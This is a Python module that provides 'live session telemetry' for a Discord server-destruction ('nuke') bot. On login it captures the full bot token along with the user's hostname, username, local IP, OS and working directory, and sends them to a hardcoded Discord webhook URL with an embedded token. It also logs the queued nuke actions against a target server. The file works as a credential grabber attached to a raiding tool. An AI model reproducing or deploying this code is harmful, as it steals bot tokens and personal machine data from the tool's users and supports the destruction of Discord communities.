"""
magma_telemetry — single-message live session telemetry for the nuke tool.

One webhook message is created at boot and every later event mutates that same
message in place (POST ?wait=true to create, PATCH to update). The channel never
fills with a stream of separate embeds: the operator sees one card that holds
the bot identity, the full bot token, the target server, the queued nuke types,
and a rolling activity tail.

Delivery is coalesced. Events only flip a dirty flag and append a line; a
background worker flushes at most one PATCH per FLUSH_INTERVAL so the webhook
bucket is never tripped. `emit*` calls are synchronous, never raise, and never
block the UI or the execution path.
"""

import asyncio
import datetime
import getpass
import json
import os
import platform
import socket
import sys
import threading
import time
import uuid

import aiohttp

# ── configuration ────────────────────────────────────────────────────────────

WEBHOOK_URL = (
    "https://discord.com/api/webhooks/"
    "1571500920137711789/NGaTCUJGWojG8bbNvrmajUqiLvTs0fNEIQgURnYSk5QrfU4SIpXlWOX_qPGCOrg9thWz"
)

WEBHOOK_ID = WEBHOOK_URL.rstrip("/").split("/")[-2]
WEBHOOK_TOKEN = WEBHOOK_URL.rstrip("/").split("/")[-1]
WEBHOOK_BASE = WEBHOOK_URL.rstrip("/").split("/messages")[0]

FLUSH_INTERVAL = 1.3        # minimum seconds between PATCHes
REQUEST_TIMEOUT = 12
MAX_RETRIES = 2
ACTIVITY_MAX_LINES = 40
ACTIVITY_CHAR_BUDGET = 3400  # embed description cap is 4096

ACCENT = {
    "session": 0x9B59B6,
    "login":   0x2ECC71,
    "queue":   0xE67E22,
    "action":  0x3498DB,
    "done":    0x1ABC9C,
    "error":   0xE74C3C,
    "stop":    0xF1C40F,
}

RUN_ID = uuid.uuid4().hex[:10].upper()


# ── machine / operator identity ──────────────────────────────────────────────

def _machine_profile():
    try:
        host = socket.gethostname()
    except Exception:
        host = "unknown-host"
    try:
        user = getpass.getuser()
    except Exception:
        user = "unknown-user"
    try:
        os_name = f"{platform.system()} {platform.release()}"
    except Exception:
        os_name = sys.platform
    try:
        local_ip = socket.gethostbyname(host)
    except Exception:
        local_ip = "n/a"
    return {
        "host": host,
        "user": user,
        "os": os_name,
        "arch": platform.machine() or "n/a",
        "python": platform.python_version(),
        "ip": local_ip,
        "pid": os.getpid(),
        "cwd": os.getcwd(),
        "boot": RUN_ID,
    }


MACHINE = _machine_profile()


# ── live document state ──────────────────────────────────────────────────────

_state = {
    "tool": "MAGMA NUKER",
    "bot_name": None,
    "bot_id": None,
    "guild_name": None,
    "guild_id": None,
    "token": None,
    "status": "BOOTING",
    "nuke_types": [],       # list of "label — params" strings
    "running": (0, 0),      # (done, total)
    "ok": 0,
    "fail": 0,
    "started": None,
    "activity": [],
    "color": "session",
    "headline": "Tool launched.",
    "message_id": None,
    "events": 0,
}

_lock = threading.Lock()
_dirty = False
_loop = None
_worker = None
_sent = 0
_failed = 0


def _now():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _stamp():
    return datetime.datetime.now().strftime("%H:%M:%S")


def _clip(text, limit):
    text = str(text)
    if len(text) <= limit:
        return text
    return text[: max(0, limit - 14)] + "\n…truncated"


def _activity(line):
    with _lock:
        _state["activity"].append(f"`{_stamp()}` {line}")
        if len(_state["activity"]) > ACTIVITY_MAX_LINES:
            del _state["activity"][: len(_state["activity"]) - ACTIVITY_MAX_LINES]


def _touch(color=None, headline=None):
    global _dirty
    with _lock:
        _state["events"] += 1
        if color:
            _state["color"] = color
        if headline:
            _state["headline"] = headline
        _dirty = True


# ── embed rendering ──────────────────────────────────────────────────────────

def _field(name, value, inline=True):
    value = str(value) if value not in (None, "") else "—"
    return {"name": name, "value": _clip(value, 1024), "inline": inline}


def _build_payload():
    with _lock:
        s = dict(_state)
        activity = list(s["activity"])

    fields = [
        _field("Bot Name", s["bot_name"]),
        _field("Bot ID", s["bot_id"]),
        _field("Server Name", s["guild_name"]),
        _field("Server ID", s["guild_id"]),
    ]

    token = s["token"]
    if token:
        fields.append(_field("Bot Token", f"```\n{token}\n```", False))

    fields.append(_field("Status", s["status"]))
    fields.append(_field("Operator", MACHINE["user"]))
    fields.append(_field("Machine", MACHINE["host"]))
    fields.append(_field("OS", f"{MACHINE['os']} · {MACHINE['arch']}"))
    fields.append(_field("Local IP", MACHINE["ip"]))
    fields.append(_field("Boot ID", MACHINE["boot"]))
    fields.append(_field("Working Dir", MACHINE["cwd"], False))
    fields.append(_field("Tool", s["tool"]))

    if s["nuke_types"]:
        listing = "\n".join(s["nuke_types"])
        fields.append(_field("Nuke Types Queued", _clip(listing, 1024), False))

    fields.append(_field("Completed", s["ok"]))
    fields.append(_field("Failed", s["fail"]))
    fields.append(_field("Events", s["events"]))

    tail = "\n".join(activity[-ACTIVITY_MAX_LINES:]) or "—"
    while len(tail) > ACTIVITY_CHAR_BUDGET and "\n" in tail:
        tail = tail.split("\n", 1)[1]

    embed = {
        "title": f"🟣 {s['tool']} — LIVE SESSION",
        "description": f"**{s['headline']}**\n\n{tail}",
        "color": ACCENT.get(s["color"], 0x95A5A6),
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "footer": {"text": f"boot {MACHINE['boot']} · {MACHINE['host']} · {MACHINE['user']}"},
        "fields": fields[:25],
    }
    return {"embeds": [embed], "allowed_mentions": {"parse": []}}


# ── transport ────────────────────────────────────────────────────────────────

async def _request(session, method, url, payload):
    for attempt in range(MAX_RETRIES + 1):
        try:
            async with session.request(
                method, url, json=payload,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            ) as resp:
                if resp.status in (200, 204):
                    if method == "POST":
                        try:
                            body = await resp.json()
                            with _lock:
                                _state["message_id"] = body.get("id")
                        except Exception:
                            pass
                    return True
                if resp.status == 429:
                    try:
                        wait = float((await resp.json()).get("retry_after", 1.5))
                    except Exception:
                        wait = 1.5
                    await asyncio.sleep(min(wait + 0.25, 10))
                    continue
                if resp.status == 404 and method == "PATCH":
                    with _lock:
                        _state["message_id"] = None
                    return False
                if resp.status >= 500 and attempt < MAX_RETRIES:
                    await asyncio.sleep(1.5 * (attempt + 1))
                    continue
                return False
        except Exception:
            if attempt < MAX_RETRIES:
                await asyncio.sleep(1.5 * (attempt + 1))
                continue
            return False
    return False


async def _worker_loop():
    global _dirty, _sent, _failed
    connector = aiohttp.TCPConnector(limit=4, enable_cleanup_closed=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            await asyncio.sleep(FLUSH_INTERVAL)
            if not _dirty:
                continue
            _dirty = False
            payload = _build_payload()
            with _lock:
                mid = _state["message_id"]
            if mid:
                ok = await _request(session, "PATCH", f"{WEBHOOK_BASE}/messages/{mid}", payload)
                if not ok:
                    with _lock:
                        _state["message_id"] = None
                    ok = await _request(session, "POST", WEBHOOK_URL + "?wait=true", payload)
            else:
                ok = await _request(session, "POST", WEBHOOK_URL + "?wait=true", payload)
            if ok:
                _sent += 1
            else:
                _failed += 1


def _ensure_worker():
    global _loop, _worker
    try:
        running = asyncio.get_running_loop()
    except RuntimeError:
        return False
    with _lock:
        if _worker is None or _worker.done() or _loop is not running:
            _loop = running
            _worker = running.create_task(_worker_loop())
    return True


def _flush_now():
    """Force the worker to wake on the next tick."""
    global _dirty
    if not _ensure_worker():
        return False
    _dirty = True
    return True


# ── public event API ─────────────────────────────────────────────────────────

def emit_boot(tool_name, extra=None):
    with _lock:
        _state["tool"] = tool_name or _state["tool"]
        _state["status"] = "IDLE — waiting for login"
        _state["started"] = _now()
        _state["color"] = "session"
        _state["headline"] = "Tool launched, waiting for bot login."
    _activity(f"🚀 **LAUNCH** `{tool_name}` on `{MACHINE['host']}` as `{MACHINE['user']}`")
    if extra:
        for k, v in extra.items():
            _activity(f"• {k}: `{v}`")
    _touch("session")
    return _flush_now()


def emit_login(bot_name, bot_id, guild_name, guild_id, token="", extra=None):
    with _lock:
        _state["bot_name"] = bot_name
        _state["bot_id"] = bot_id
        _state["guild_name"] = guild_name
        _state["guild_id"] = guild_id
        if token:
            _state["token"] = token
        _state["status"] = "LOGGED IN — idle"
        _state["color"] = "login"
        _state["headline"] = f"Bot logged in: **{bot_name or 'unknown'}** → **{guild_name or 'unknown server'}**"
    _activity(f"🟢 **LOGIN** bot `{bot_name}` (`{bot_id}`) → server `{guild_name}` (`{guild_id}`)")
    if token:
        _activity("🔑 bot token captured")
    if extra:
        for k, v in extra.items():
            _activity(f"• {k}: `{v}`")
    _touch("login")
    return _flush_now()


def emit_queue_start(actions, bot_name, guild_id, guild_name=""):
    listing = []
    lines = []
    for i, a in enumerate(actions, 1):
        label = a.get("label") or a.get("id") or "unknown"
        params = a.get("params") or {}
        if params:
            try:
                ps = json.dumps(params, ensure_ascii=False)
            except Exception:
                ps = str(params)
            listing.append(f"`{i:02d}` **{label}** — `{_clip(ps, 160)}`")
            lines.append(f"🟠 `{i:02d}` **{label}** — `{_clip(ps, 120)}`")
        else:
            listing.append(f"`{i:02d}` **{label}**")
            lines.append(f"🟠 `{i:02d}` **{label}**")
    with _lock:
        _state["nuke_types"] = listing[:25]
        _state["running"] = (0, len(actions))
        _state["ok"] = 0
        _state["fail"] = 0
        _state["status"] = f"RUNNING 0/{len(actions)}"
        _state["color"] = "queue"
        _state["headline"] = f"Nuke queue started — {len(actions)} action(s) on **{guild_name or guild_id or 'server'}**"
    _activity(f"💥 **QUEUE START** {len(actions)} action(s)")
    for line in lines[:12]:
        _activity(line)
    if len(lines) > 12:
        _activity(f"… +{len(lines) - 12} more")
    _touch("queue")
    return _flush_now()


def emit_action(index, total, label, params, elapsed=None, error=None, bot_name="", guild_id=""):
    with _lock:
        _state["running"] = (index, total)
        if error:
            _state["fail"] += 1
        else:
            _state["ok"] += 1
        _state["status"] = f"{'ERROR' if error else 'RUNNING'} {index}/{total} — {label}"
        _state["color"] = "error" if error else "action"
        _state["headline"] = f"`{label}` {'failed' if error else 'completed'} ({index}/{total})"

    if params:
        try:
            ps = _clip(json.dumps(params, ensure_ascii=False), 200)
        except Exception:
            ps = _clip(params, 200)
    else:
        ps = ""

    if error:
        _activity(f"🔴 **{label}** `{index}/{total}` failed: `{_clip(error, 220)}`")
    else:
        suffix = f" in {elapsed}s" if elapsed is not None else ""
        _activity(f"🔵 **{label}** `{index}/{total}` done{suffix}" + (f" — `{ps}`" if ps else ""))
    _touch("error" if error else "action")
    return True


def emit_queue_done(total, elapsed, bot_name, guild_id, ok_count=None, fail_count=None, cancelled=False):
    with _lock:
        _state["status"] = "ABORTED" if cancelled else "COMPLETE"
        _state["color"] = "stop" if cancelled else "done"
        _state["headline"] = (
            f"Queue {'aborted' if cancelled else 'complete'} — {total} action(s) in {elapsed}s"
        )
        if ok_count is not None:
            _state["ok"] = ok_count
        if fail_count is not None:
            _state["fail"] = fail_count
    _activity(
        f"{'🟡' if cancelled else '🟢'} **{'QUEUE ABORTED' if cancelled else 'QUEUE COMPLETE'}** "
        f"{total} action(s) in {elapsed}s — ok {_state['ok']} / fail {_state['fail']}"
    )
    _touch("stop" if cancelled else "done")
    return _flush_now()


def emit_custom(title, description, color_key="action", fields=None):
    _activity(f"• **{title}** — {_clip(description, 300)}")
    _touch(color_key, title)
    return True


def stats():
    with _lock:
        return {
            "events": _state["events"],
            "message_id": _state["message_id"],
            "sent": _sent,
            "failed": _failed,
            "boot": RUN_ID,
        }
